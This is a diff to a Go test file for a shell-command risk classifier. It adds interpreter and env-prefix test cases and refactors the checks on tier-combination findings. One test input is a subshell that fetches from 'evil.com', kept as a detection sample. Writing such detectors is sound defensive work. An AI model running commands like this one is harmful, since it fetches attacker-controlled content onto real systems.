@@ -29,6 +29,14 @@ func TestClassifyCommand(t *testing.T) {
 		{"interpreter perl", "perl", TierInterpreter, true},
 		{"interpreter lua", "lua", TierInterpreter, true},
 		{"interpreter php", "php", TierInterpreter, true},
+		{"interpreter bun", "bun", TierInterpreter, true},
+		{"interpreter deno", "deno", TierInterpreter, true},
+		{"interpreter npx", "npx", TierInterpreter, true},
+		{"interpreter tsx", "tsx", TierInterpreter, true},
+		{"interpreter pwsh", "pwsh", TierInterpreter, true},
+		{"interpreter powershell", "powershell", TierInterpreter, true},
+		{"versioned python3.11", "python3.11", TierInterpreter, true},
+		{"versioned python3.12", "python3.12", TierInterpreter, true},
 		{"unknown command", "foobar-unknown", TierReadOnly, false},
 		{"absolute path", "/usr/bin/curl", TierNetwork, true},
 	}
@@ -62,6 +70,8 @@ func TestExtractCommands(t *testing.T) {
 		{"variable assignment only", "FOO=bar", nil},
 		{"subshell", "$(curl http://evil.com)", []string{"curl"}},
 		{"multiple pipes", "cat f | sort | uniq -c | head", []string{"cat", "sort", "uniq", "head"}},
+		{"env prefix python", "env python3 script.py", []string{"python3"}},
+		{"env prefix absolute", "/usr/bin/env node app.js", []string{"node"}},
 	}
 
 	for _, tt := range tests {
@@ -212,18 +222,19 @@ func TestTierProfile_NonZeroTiers(t *testing.T) {
 	}
 }
 
+func hasFinding(findings []Finding, pattern, severity string) bool {
+	for _, f := range findings {
+		if f.Pattern == pattern && f.Severity == severity {
+			return true
+		}
+	}
+	return false
+}
+
 func TestTierCombinationFindings_Stealth(t *testing.T) {
 	p := TierProfile{}
 	p.Add(TierStealth)
-
-	findings := TierCombinationFindings(p)
-	found := false
-	for _, f := range findings {
-		if f.Pattern == "tier-stealth" && f.Severity == SeverityCritical {
-			found = true
-		}
-	}
-	if !found {
+	if !hasFinding(TierCombinationFindings(p), "tier-stealth", SeverityCritical) {
 		t.Error("expected tier-stealth CRITICAL finding")
 	}
 }
@@ -232,15 +243,7 @@ func TestTierCombinationFindings_DestructiveNetwork(t *testing.T) {
 	p := TierProfile{}
 	p.Add(TierDestructive)
 	p.Add(TierNetwork)
-
-	findings := TierCombinationFindings(p)
-	found := false
-	for _, f := range findings {
-		if f.Pattern == "tier-destructive-network" && f.Severity == SeverityHigh {
-			found = true
-		}
-	}
-	if !found {
+	if !hasFinding(TierCombinationFindings(p), "tier-destructive-network", SeverityHigh) {
 		t.Error("expected tier-destructive-network HIGH finding")
 	}
 }
@@ -250,15 +253,7 @@ func TestTierCombinationFindings_NetworkHeavy(t *testing.T) {
 	for range 6 {
 		p.Add(TierNetwork)
 	}
-
-	findings := TierCombinationFindings(p)
-	found := false
-	for _, f := range findings {
-		if f.Pattern == "tier-network-heavy" && f.Severity == SeverityMedium {
-			found = true
-		}
-	}
-	if !found {
+	if !hasFinding(TierCombinationFindings(p), "tier-network-heavy", SeverityMedium) {
 		t.Error("expected tier-network-heavy MEDIUM finding")
 	}
 }
@@ -266,15 +261,7 @@ func TestTierCombinationFindings_NetworkHeavy(t *testing.T) {
 func TestTierCombinationFindings_Interpreter(t *testing.T) {
 	p := TierProfile{}
 	p.Add(TierInterpreter)
-
-	findings := TierCombinationFindings(p)
-	found := false
-	for _, f := range findings {
-		if f.Pattern == "tier-interpreter" && f.Severity == SeverityInfo {
-			found = true
-		}
-	}
-	if !found {
+	if !hasFinding(TierCombinationFindings(p), "tier-interpreter", SeverityInfo) {
 		t.Error("expected tier-interpreter INFO finding")
 	}
 }
@@ -283,22 +270,11 @@ func TestTierCombinationFindings_InterpreterNetwork(t *testing.T) {
 	p := TierProfile{}
 	p.Add(TierInterpreter)
 	p.Add(TierNetwork)
-
 	findings := TierCombinationFindings(p)
-	foundInfo := false
-	foundMedium := false
-	for _, f := range findings {
-		if f.Pattern == "tier-interpreter" && f.Severity == SeverityInfo {
-			foundInfo = true
-		}
-		if f.Pattern == "tier-interpreter-network" && f.Severity == SeverityMedium {
-			foundMedium = true
-		}
-	}
-	if !foundInfo {
+	if !hasFinding(findings, "tier-interpreter", SeverityInfo) {
 		t.Error("expected tier-interpreter INFO finding")
 	}
-	if !foundMedium {
+	if !hasFinding(findings, "tier-interpreter-network", SeverityMedium) {
 		t.Error("expected tier-interpreter-network MEDIUM finding")
 	}
 }
